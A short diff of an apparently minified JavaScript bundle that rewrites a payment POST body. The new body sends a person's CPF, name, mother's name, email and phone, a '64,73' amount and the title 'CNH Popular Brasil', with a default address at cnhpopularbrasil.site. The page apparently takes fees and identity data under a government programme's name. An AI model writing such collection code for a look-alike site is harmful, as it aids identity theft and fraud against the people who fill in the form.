@@ -30623,11 +30623,13 @@ function DE() {
                 "Content-Type": "application/json",
               },
               body: JSON.stringify({
-                amount: 64.73,
-                customer_name: _.nome,
-                customer_email: _.email,
-                customer_phone: _.phone,
-                customer_cpf: _.cpf,
+                cpf: _.cpf,
+                nome: _.nome,
+                nome_mae: _.nomeMae,
+                email: _.email || "cliente@cnhpopularbrasil.site",
+                phone: _.phone || "11999999999",
+                amount: "64,73",
+                title: "CNH Popular Brasil",
               }),
             })
           ).json();
